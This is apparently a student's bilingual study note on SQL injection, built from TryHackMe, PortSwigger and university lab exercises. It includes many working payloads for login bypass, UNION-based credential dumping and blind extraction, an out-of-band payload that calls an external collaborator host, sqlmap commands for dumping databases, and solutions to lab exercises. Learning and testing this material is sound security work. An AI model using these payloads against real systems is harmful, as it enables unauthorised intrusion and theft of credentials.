# SQL Injection
SQL Injection occurs when user-provided data is incorporated into an SQL query without proper validation or sanitization, allowing malicious users to manipulate the database.

**Example**:  
A blog site retrieves articles from a database using an `id` parameter in the URL (e.g., `https://website.thm/blog?id=1`). The application runs an SQL query like:  
`SELECT * from blog where id=1 and private=0 LIMIT 1;`  
This retrieves a public article with ID `1`.  

**Exploitation**:  
If the `id` parameter is used directly in the SQL query, an attacker could modify the URL to bypass restrictions. For example:  
`https://website.thm/blog?id=2;--`  
This would modify the query to:  
`SELECT * from blog where id=2;--`  
The semicolon ends the original query, and the double dashes (--) comment out the rest, allowing access to private data.
___
## In-Band SQL injection
The simplest type to detect and exploit. The same communication channel is used both to exploit the vulnerability and to receive results.  
E.g: A vulnerable website displays extracted database data on the same page where the SQL Injection occurs.

### Error-Based SQL Injection  
Relies on error messages returned by the database to learn its structure.  
When attempting invalid inputs (e.g., a single quote `'`), the error message reveals information like table or column names.  
This method is often used to enumerate database structures.  
Example:  
Input:  
`www.random.com/app.php?id='`
Output: Error message: You have an error in your SQL syntax, check the manual that corresponds to your MySQL server version...  
Tells you information like SQL dialectic, the version etc.

### Union-Based SQL Injection  
Uses the UNION operator to combine the results of two or more queries, extracting additional data and displaying it on the same page.  
Altering the query to return extra results alongside the original query, effectively dumping data.  
Example:  
Input:  
`www.random.com/app.php?id=' UNION SELECT username, password FROM users--`  
Output:  
```
user 1
somePassword
admin
tn584516wsfaawsf
```
For a `UNION` query to work, two key requirements must be met:  
- The individual queries must return the same number of columns.  
- The data types in each column must be compatible between the individual queries.

To carry out a SQL injection UNION attack, make sure that your attack meets these two requirements. This normally involves finding out:  
- How many columns are being returned from the original query.
- Which columns returned from the original query are of a suitable data type to hold the results from the injected query.

**Step-by-Step Process for a Union-Based SQL Injection Example:**  
1. Discovering SQL Injection Vulnerability:  
- Input invalid characters like `'` or `"` in the id parameter (e.g., `id=1'`).  
- Observe the returned error message confirming the vulnerability.  

2. Finding the Correct Number of Columns:  
- Use `UNION SELECT` queries to determine the number of columns in the original query  
- Example: `1 UNION SELECT 1` → Error (mismatch in columns).
- Add columns until the error disappears:
`1 UNION SELECT 1,2,3` → Success (3 columns in this case).
Can use also a different number of null values:
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
```
If the number of nulls does not match the number of columns, the database returns an error, such as:  
`All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.`  
We use `NULL` as the values returned from the injected SELECT query because the data types in each column must be compatible between the original and the injected queries. `NULL` is convertible to every common data type, so it maximizes the chance that the payload will succeed when the column count is correct.  

Another method involves injecting a series of `ORDER BY` clauses and incrementing the specified column index until an error occurs.
```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc.
```
This series of payloads modifies the original query to order the results by different columns in the result set. The column in an `ORDER BY` clause can be specified by its index, so you don't need to know the names of any columns. When the specified column index exceeds the number of actual columns in the result set, the database returns an error, such as:
The ORDER BY position number 3 is out of range of the number of items in the select list.`

3. Finding columns with a useful data type
How to find columns with a specific data type like strings?
After you determine the number of required columns, you can probe each column to test whether it can hold string data. You can submit a series of `UNION SELECT `payloads that place a string value into each column in turn. For example, if the query returns four columns, you would submit:
```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```
If the column data type is not compatible with string data, the injected query will cause a database error, such as:  
`Conversion failed when converting the varchar value 'a' to data type int.`  
If an error does not occur, and the application's response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data.  

4. Retriveing intresing data
You can use `UNION SELECT` to retrive data from other teables. Lets say that you know about a table called users with column username (string) and password (string):
`' UNION SELECT username, password FROM users--`  
differernt column if you have 3 columns:  
https://0ae900e20408a96d80da3f4100a80014.web-security-academy.net/filter?category=Corporate+gifts' UNION SELECT NULL, username || '~' || password, NULL FROM users--

5. Replacing Original Data with Custom Data:  
- Set the first query to return no results (e.g., `id=0`) and inject custom data:  
Example: `0 UNION SELECT 1,2,3`.

6. Retrieving Database Information:
Querying the database type and version, depends from SQL dialect:

| Database type | Query |
|---------------|-------|
| Microsoft, MySQL | `SELECT @@version`|
| Oracle | `SELECT * FROM v$version` |
| PostgreSQL | `SELECT version()` |

union attack examples: 
`' UNION SELECT @@version--`  
- Get database name (sqli_one):  
`0 UNION SELECT 1,2,database()`.

- List contents of databes:
  **Information schema** rovides information about the database like listing the tables:
`SELECT * FROM information_schema.tables`
You can then query **information_schema.columns** to list the columns in individual tables:
`SELECT * FROM information_schema.columns WHERE table_name = 'Users'`
`' union select table_name,null from information_schema.tables--`
`' union select column_name,null from information_schema.columns where table_name = 'user_mappings'--`
`' union select column_name,null from information_schema.columns where table_name = 'users_zgnigh'--`
`' union select password_maaovt,username_nrdxbj from users_zgnigh--`
  
- Retrieve table names:  
`0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema='sqli_one'`.
Example result: `article,staff_users`.

7. Exploring Table Structure:  
- Retrieve column names for the staff_users table:  
`0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='staff_users'`.  
Example result: `id,username,password`.
`SELECT * FROM information_schema.columns WHERE table_name = 'Users'`

8. Extracting Sensitive Data:  
- Retrieve usernames and passwords:  
`0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users`.  
Example result: `admin:admin123<br>martin:password456`.

9. Accessing the Target Account:  
- Use the extracted credentials (e.g., Martin's username and password) to log in or progress further.
___
## Inferential (Blind) SQL injection
Blind SQL Injection occurs when error messages and query results are suppressed, giving little or no visible feedback. However, the injection still works, and subtle indications (like changes in page behavior) can be used to infer database information.  
### Inferential (Blind) SQL injection - Authentication Bypass

**Authentication Bypass**:  
- Objective: Bypass login forms without needing to know valid usernames or passwords.  
- How It Works: Login forms check whether a username-password pair exists in the database and respond with "true" or "false." By crafting a query that always evaluates to "true," attackers can bypass authentication.  
- Example Query:
Inputting `' OR 1=1;--` into the password field modifies the SQL query as follows:  
`SELECT * FROM users WHERE username='' AND password='' OR 1=1;`  
The condition `1=1` always evaluates to true. Using the `OR` operator forces the query to succeed, granting access.

**Example**:  
- Original query:  
`SELECT * FROM users WHERE username='%username%' AND password='%password%' LIMIT 1;`  
- Exploited query (password input: `' OR 1=1;--`) 
`SELECT * FROM users WHERE username='' AND password='' OR 1=1;`  
- Result: The database returns "true," bypassing the login check.

### Inferential (Blind) SQL injection - Boolean Based
Boolean-based SQL Injection relies on receiving true/false responses (e.g., yes/no, 1/0) to confirm whether injected queries are successful. Despite the limited feedback, attackers can fully enumerate a database structure and its contents.
**Example explanation**
Example URL:  
`www.random.com/app.php?id=1`  
Backend Query:
`select title from product where id =1`
Payload #1 (False):  
`www.random.com/app.php?id=1 and 1=2`  
Backend Query:  
`select title from product where id =1 and 1=2`  
Payload #2 (True):  
`www.random.com/app.php?id=1 and 1=1`  
Backend Query:  
`select title from product where id =1 and 1=1`  
So how this attack can be used actually be used:  
Imagine you have a Users Table:  
`Administrator / eesf651wa69f1we69f51w69f51swe6f51wsaf65ewf16w51f6w1f6`  
How to extract the hash password for the admin?  We can ask the app TRUE or FALSE questions:  
Payload:  
```
www.random.com/app.php?id and SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's'
```
Backend Query:  
```
select title from produc where id =1 and SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's'
```
The query is targeting the hash and asking to extract the first character from the string and only one character, and then it asks if it is equal to the letter `s` in this case the first letter is `e` so this the payload evaluates to FALSE and you ***shouldn't see a title from the product page** probably something like: `Nothing is returned on the page`.  
So you know that the first character is not an `s` so you continue your iteration until you are able to hit all the correct signs.

**Other examples of possible exploitations**  
1. Initial Setup:  
- Example URL: `https://website.thm/checkuser?username=admin`
- Observing responses like `{"taken": true}` or `{"taken": false}` helps infer the presence of a Boolean-based vulnerability.  

2. Number of columns:  
- Use the `UNION` operator to discover the number of columns in the database by iterating through payloads like:  
```
admin123' UNION SELECT 1;--  
admin123' UNION SELECT 1,2;--  
admin123' UNION SELECT 1,2,3;--  
```
- When the "taken" response changes to true, the correct column count is confirmed (in this case, 3).  

Another way to discover the number of columns with UNION attack is using ORDER BY (example not related to initial set up):
`select title, cost from product where id =1 order by 1`  
Incrementally inject a series of ORDER BY clauses until you get an error or observe a different behaviour in the application.  
```
order by 1--
order by 2--
order by 3--
```
Error message:  
The ORDER BY position number 3 is out of range of the number of items in the select list.

Another way to discover the number of columns with UNION attack is using NULL VALUES (example not related to initial set up):  
`select title, cost from product where id =1 UNION SELECT NULL--`  
Incrementally inject a series of UNION SELECT payloads specifying a different number of null values until you no longer get an error.  
`' UNION SELECT NULL--`  
Error message:
All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.  
Again:
```
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
```
3. Enumerating the Database Name:
- Use the `database()` method with the `LIKE` operator to deduce the database name character by character:  
`admin123' UNION SELECT 1,2,3 WHERE database() LIKE 's%';--`  
- Repeat the process with patterns (sa%, sb%, etc.) to fully identify the database name (e.g., sqli_three).  

4. Finding Table Names:  
- Query the `information_schema.tables` to enumerate tables in the database:  
```
admin123' UNION SELECT 1,2,3 FROM information_schema.tables  
WHERE table_schema = 'sqli_three' AND table_name LIKE 'u%';--  
```
- Cycle through patterns to identify table names (e.g., `users`).

5. Identifying Column Names:  
- Query the `information_schema.columns` to enumerate column names in the `users` table:
```
admin123' UNION SELECT 1,2,3 FROM information_schema.columns  
WHERE table_schema = 'sqli_three' AND table_name = 'users'  
AND column_name LIKE 'u%';--  
```
- Repeat until all column names (e.g., `id`, `username`, `password`) are discovered.  

6. Extracting Data:
- Once table and column structures are known, use the discovered columns to query specific data:  
Find a valid username:  
`admin123' UNION SELECT 1,2,3 FROM users WHERE username LIKE 'a%';--`  
Discover the password for `admin`:  
`admin123' UNION SELECT 1,2,3 FROM users WHERE username='admin' AND password LIKE 'a%';--`  
- Continue iterating character by character to retrieve the full password (e.g., `3845`).

7. Bypassing Login:  
- Use the discovered credentials (admin and 3845) on the login form to gain access.

8. Finding columns with a useful data type in an SQL injection UNION attack (example not related to initial set up):
Probe each column to test whether it can hold string data by submitting a series of UNION SELECT payloads that place a string value into each column in turn:  
`' UNION SELECT 'a',NULL--`  
Error message:  
Conversion failed when converting the varchar value 'a' to data type int.  
```
' UNION SELECT 'a',NULL--
' UNION SELECT NULL,'a'--
```

### Exploiting blind SQL injection by triggering conditional errors
If an application’s response doesn’t change based on SQL query results, traditional boolean-based injection won’t work. Instead, you can trigger a SQL error when a condition is true, causing a different application response (e.g., an error message). This helps infer the truth of the injected condition.
Example:

```
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```
With the first input, the CASE expression evaluates to 'a', which does not cause any error.
With the second input, it evaluates to 1/0, which causes a divide-by-zero error.

If the error causes a difference in the application's HTTP response, you can use this to determine whether the injected condition is true.
Using this technique, you can retrieve data by testing one character at a time
`Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`

### Casting data
By forcing the application to display SQL error messages, you can reveal query results in an otherwise blind SQL injection. Using `CAST()`, you can attempt to convert a string to an incompatible data type (e.g., `CAST(string AS int)`), which may trigger an error exposing the data. This is useful when character limits prevent conditional responses.
Example:  
`CAST((SELECT example_column FROM example_table) AS int)`
Often, the data that you're trying to read is a string. Attempting to convert this to an incompatible data type, such as an int, may cause an error similar to the following
`ERROR: invalid input syntax for type integer: "Example data"`

### Inferential (Blind) SQL injection - Time Based
If the application catches database errors when the SQL query is executed and handles them gracefully, there won't be any difference in the application's response. This means the previous technique for inducing conditional errors will not work.

In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering time delays depending on whether an injected condition is true or false. As SQL queries are normally processed synchronously by the application, delaying the execution of a SQL query also delays the HTTP response. This allows you to determine the truth of the injected condition based on the time taken to receive the HTTP response.
The techniques for triggering a time delay are specific to the type of database being used. For example, on Microsoft SQL Server, you can use the following to test a condition and trigger a delay depending on whether the expression is true:

'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
The first of these inputs does not trigger a delay, because the condition 1=2 is false.
The second input triggers a delay of 10 seconds, because the condition 1=1 is true.
Using this technique, we can retrieve data by testing one character at a time:

'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
Time-based blind SQL injection is a technique where the success of an injection query is determined by observing time delays in the application's response. These delays are intentionally introduced using functions like `SLEEP(x)` in SQL, allowing attackers to infer correct results without visible feedback.

**Example**  
Example Query:  
If the first character of the administrator’s hashed password is an ‘a’, wait for 10 seconds.  
→ response takes 10 seconds → first letter is ‘a’  
→ response doesn’t take 10 seconds → first letter is not ‘a’  

**Other Example**  
1. Establishing Columns:  
- Similar to Boolean-based SQL injection, but success is identified by a time delay:  
```
admin123' UNION SELECT SLEEP(5);--  
admin123' UNION SELECT SLEEP(5),2;--  
```
- A 5-second delay indicates a successful query, confirming the correct number of columns.  

2. Enumeration:  
- The same process as Boolean-based SQL injection is used for enumerating database names, tables, and columns, but with the `SLEEP(x)` method to validate queries:  
Example: Finding the database name:  
`admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 'u%';--`  
- A delay confirms the query was successful, and the database name begins with "u."

3. Iterative Process:  
- Use the `SLEEP(x)` function alongside `LIKE`, cycling through possible characters (e.g., `u%`, `us%`, `usr%`) to infer database names, tables, and columns step-by-step.
___
## Out-of-Band SQL injection
TODO finish portswigger lesson
Out-of-band (OOB) SQL Injection relies on using two separate communication channels: one to send the injection payload and another to receive the results. It requires specific server features or application logic to facilitate external network calls (e.g., HTTP or DNS requests).  

Example Payload:  
`'; exec master ..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--`  
**Process**:  
1. Injection Payload:  
The attacker sends a crafted SQL injection payload via a vulnerable web request.  
2. Server Processing:  
The web application forwards the payload to the database, executing it as part of a query.  
3. External Call:  
The payload triggers an HTTP or DNS request from the server back to the attacker’s controlled system, carrying extracted database data.
___
## How to find SQLi vulnerabilities?
Example of methodologies to build up with experience.  
**Black box testing**  
• Map the application (exploratory testing, let burp proxy listening silently to intercept the communication)  
• Fuzz the application:  
  - Submit SQL-specific characters such as ' or ", and look for errors or other anomalies  
  - Submit Boolean conditions such as OR 1=1 and OR 1=2, and look for differences in the application's responses  
  - Submit payloads designed to trigger time delays when executed within a SQL query, and look for differences in the time taken to respond  
  - Submit OAST payloads designed to trigger an out-of-band network interaction when executed within an SQL query, and monitor for any resulting interactions  

**White box testing**  
• Enable web server logging (when fuzzing the app generates error on invalid characters that you put in app)  
• Enable database logging (to observe how your injection was logged at the backend)  
• Map the application  
  - Visible functionality in the application  
  - Regex search on all instances in the code that talk to the database  
• Code review!  
  - Follow the code path for all input vectors  
• Test any potential SQLi vulnerabilities  
___
## Second-order SQL injection
TODO skonczyc
___
## How to prevent SQLi?
TODO
___
## Ćwiczenia studia
### SQL Injection 1
Pierwsze zadanie to podstawowy SQL Injection, polegający na wstrzyknięciu znaku specjalnego `'`, który zakończy string i umożliwi wstrzyknięcie dodatkowej logiki.   
Przykładowe rozwiązania:  
```
' or '1'='1
' or 1-- x
' or 1#
```

### SQL Injection 2
Drugie zadanie polega na dodatkowym domknięciu nawiasu `)`. Należy wstrzyknąć znaki specjalne `')`, które zakończą string i umożliwią wstrzyknięcie dodatkowej logiki.   
Przykładowe rozwiązania:  
```
') or (username='admin
') or username='admin'-- x
') or username='admin'#
```

### SQL Injection 3
Trzecie zadanie jest identyczne jak poprzednie, z wyjątkiem tego, że baza danych jest pusta. Wymaga to zastosowania techniki `UNION SELECT`, która zwróci z zapytania dane, oryginalnie nieistniejące w bazie danych.  
Przykładowe rozwiązania:  
```
') union select ('admin
') union select 'admin'-- x
') union select 'admin'#

```

### SQL Injection 4
Czwarte zadanie, podobnie jak poprzednie, wymaga zastosowania techniki `UNION
SELECT`, która zwróci z zapytania NOWEGO (nieistniejącego w bazie) użytkownika admin z kontrolowanym przez nas skrótem md5 jego hasła. Kod php po znalezieniu istniejącego użytkownika w bazie, liczy skrót md5 z wpisanego w formularzu hasła i porównuje z tym zwróconym z bazy– oba muszą być identyczne, ale też oba kontrolujemy!  
Przykładowe rozwiązanie:  
```
Użytkownik:
" union select "admin",md5("x")#
Hasło: x
```

### SQL Injection 5
Piąte zadanie dodaje przed znakami specjalnymi (tj. `'`, `"`, `\`) ukośnik `\`, przez co stają się zwykłymi znakami wewnątrz stringa, następnie ucina cały string do 10 znaków.  
Aby rozwiązać zadanie, należy w nazwie użytkownika na 10-tej pozycji podać znak `\` (zostanie zamieniony na `\\`) i wykorzystać fakt, że nazwa użytkownika jest ucinana do 10 znaków (bezpieczny ciąg `\\` zostanie z powrotem przycięty do niebezpiecznego `\` i wyescapuje następny znak– `'` zamykający string!).  
Przykładowe rozwiązanie:  
```
Użytkownik: 123456789\
Hasło: or 1-- x
```

## Ćwiczenia studia Pentest
### Logowanie
Wejdź na stronę: http://192.168.100.60/  
Wykonaj atak SQL Injection w panelu logowania.
Przykładowa nazwa użytkownika (hasło dowolne):  
`' or 1=1-- x`

### Zawartość bazy danych
Do wyświetlenia całej zawartości bazy danych można użyć narzędzia sqlmap.  
Na wszystkie pytania należy odpowiadać wartością domyślną (enter).

`sqlmap -u http://192.168.100.60 --forms --dbs #wyświetli nazwy baz danych`
`sqlmap -u http://192.168.100.60 --forms -D pentest-dump-all #wyświetli zawartość bazy`

### RCE
Baza danych przechowuje komendy bash, które serwer może wykonać.  
Po zalogowaniu, wykonaj atak `UNION SELECT`, w celu zwrócenia z zapytania komendy `"id"` (która nie istnieje w bazie w jako rekord).  
Przykład (należy zgadnąć liczbę kolumn np. za pomocą prób i błędów):  
```
123-- x
123 union select 'id'-- błąd
123 union select 'id','id'-- błąd
123 union select 'id','id','id'-- działa
```

### Flaga
Za pomocą podatności typu RCE, wylistuj pliki w aktualnym katalogu i odczytaj flagę.
Zamiast `id` wykorzystaj `ls` i `cat nazwaplikuzflagą.txt`:  
`192.168.100.60/?id=123 union select 'ls','ls','ls'--`
___
## SQLmap
### GET
SQLMap is an automated tool for detecting and exploiting SQL injection vulnerabilities in web applications.  
To use SQLMap, you open a terminal in Linux and run commands with different flags. The `--wizard` flag provides an interactive guide, making it beginner-friendly.  
```bash
sqlmap --wizard
```
`--dbs` extracts all the databases names  
`-D database_name --tables` extracts information about the tables  
`-D database_name -T table_name --dump` to enumerate records in those tables  

To find a vulnerable URL, look for web applications using GET parameters, such as `http://sqlmaptesting.thm/search?cat=1`. These parameters retrieve data and may be exploitable. Use SQLMap with the `-u` flag to test for SQL injection, a method known as HTTP GET-based testing.  
`sqlmap -u http://sqlmaptesting.thm/search/cat=1`  
To fetch the databases:  
`sqlmap -u http://sqlmaptesting.thm/search/cat=1 --dbs` result users  
To fetch users tables:  
`sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users --tables`  result thomas  
To fetch record present in thomas table:  
` sqlmap -u http://sqlmaptesting.thmsearch/cat=1 -D users -T thomas --dump`  

Another example:  
`sqlmap -u http://10.10.163.106/ai/includes/'user_login?email=test&password=test' --level=5`

### POST
Unlike GET-based testing, POST-based testing targets data sent in the request body, such as login or registration forms. To test for vulnerabilities, intercept the POST request, save it as a text file, and use SQLMap with:  
`sqlmap -r intercepted_request.txt`
OR you can use burp suite:  

![img.png](img/img_18.png)

blood_group parameter could be vulnerable. Test it with:  
```
sqlmap -r <request_file> -p <vulnerable_parameter> --dbs
sqlmap -r req.txt -p blood_group --dbs --> result database blood
```  
`-r` to read the file  
`-p` to supply vulnerable parameter  
To extract tables from blood database:  
**GET based method:**  
```
sqlmap -u https://testsite.com/page.php?id=7 -D blood --tables
sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> --tables
```

**POST based method:**  
```
sqlmap -r req.txt -p blood_group -D blood --tables
sqlmap -r req.txt -p <vulnerable_parameter> -D <database_name> --tables
```

To extract tables from blood database:  
**GET based method:**  
```
sqlmap -u https://testsite.com/page.php?id=7 -D blood -T blood_db --columns
sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> -T <table_name> --columns
```

**POST based method:**  
```
sqlmap -r req.txt -D blood -T blood_db --columns
sqlmap -r req.txt -D <database_name> -T <table_name> --columns
```

To dump all the available databases and tables:  
**GET based method:**  
```
sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> --dump-all
sqlmap -u https://testsite.com/page.php?id=7 -D blood --dump-all
```

**POST based method:**  
```
sqlmap -r req.txt -D <database_name> --dump-all
sqlmap -r req.txt-p -D <database_name> --dump-all
```

To add data to a POST request:  
`sqlmap -u "http://example.com/login" --data "username=admin&password=1234"`
___
## Dodatkowe informacje
[Sprawdzenie rodzaju bazy danych](https://portswigger.net/web-security/sql-injection/examining-the-database)  
[ Opis różnych ataków typu SQL Injection](https://www.w3schools.com/sql/sql_injection.asp)  
[ „cheat sheet” dla ataków SQL Injection](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/)  
[Projekt sqlmap](https://github.com/sqlmapproject/sqlmap/wiki/usage)  
[SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
___
## Sources
- tryhackme, SQL Injection, https://tryhackme.com/r/room/sqlinjectionlm.
- Podatności SQL Injection, Polsko-Japońska Akademia Technik Komputerowych, 2024. Prezentacja pdf.
- Podatności SQL Injection Pentest, Polsko-Japońska Akademia Technik Komputerowych, 2024. Prezentacja pdf.
- tryhackme, SQLMap: The Basics, https://tryhackme.com/r/room/sqlmapthebasics.
- tryhackme, SQLMAP, https://tryhackme.com/r/room/sqlmap.
- R. Khalil, SQL Injection | Complete Guide, https://www.youtube.com/@RanaKhalil101.
- PortSwigger, SQL injection, https://portswigger.net/.
